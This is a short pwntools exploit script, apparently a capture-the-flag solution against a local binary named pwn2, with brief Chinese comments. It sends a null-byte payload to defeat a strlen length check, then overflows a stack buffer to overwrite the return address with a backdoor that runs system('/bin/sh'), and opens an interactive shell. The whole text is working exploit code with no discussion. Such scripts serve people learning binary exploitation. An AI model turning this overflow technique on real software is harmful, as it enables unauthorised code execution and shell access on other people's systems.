from pwn import *
context(log_level = 'debug')
p = process("./pwn2")
e = ELF("./pwn2")


payload = b'\x00' + b'M'*0x10   # 可以全覆盖为M,也可以只覆盖目标值为M
p.sendlineafter("strlen?", payload)
binsh=0x080486CA    # 后门执行system("/bin/sh")地址
payload = b'a'*0x10 + b'a'*0x8 + p32(binsh) # 记得覆盖
payload = payload.ljust(255+7, b'a') #
p.recvuntil('Clearlove')
p.sendline(payload)

p.interactive()